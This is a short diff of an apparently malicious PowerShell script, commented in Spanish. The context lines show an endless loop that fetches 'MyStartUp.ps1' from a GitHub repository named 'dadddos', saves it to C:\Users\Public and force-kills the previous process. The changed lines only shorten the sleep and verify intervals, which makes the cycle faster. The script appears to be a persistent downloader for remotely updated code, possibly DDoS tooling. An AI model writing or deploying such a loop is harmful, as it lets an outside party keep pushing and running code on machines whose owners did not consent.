@@ -3,7 +3,7 @@ $down = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1
 
 
 $filePath = "C:\Users\Public\MyStartUp.ps1"
-$verifyInterval = 534
+$verifyInterval = 150
 
 # Variables para rastrear el PID anterior
 $previousPID = $null
@@ -14,7 +14,7 @@ while ($true) {
         $previousPID = $process.Id
     }
 
-    Start-Sleep 9.6
+    Start-Sleep 5.6
     # Terminar el proceso anterior si existe   
     if ($previousPID -ne $null -and (Get-Process -Id $previousPID -ErrorAction SilentlyContinue)) {
         Stop-Process -Id $previousPID -Force
@@ -37,7 +37,7 @@ while ($true) {
     Start-Sleep 5
     Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
     } else {
-    Start-Sleep 17
+    Start-Sleep 8
     Invoke-WebRequest -Uri $down -OutFile $filePath
     }
     Start-Sleep 8.8
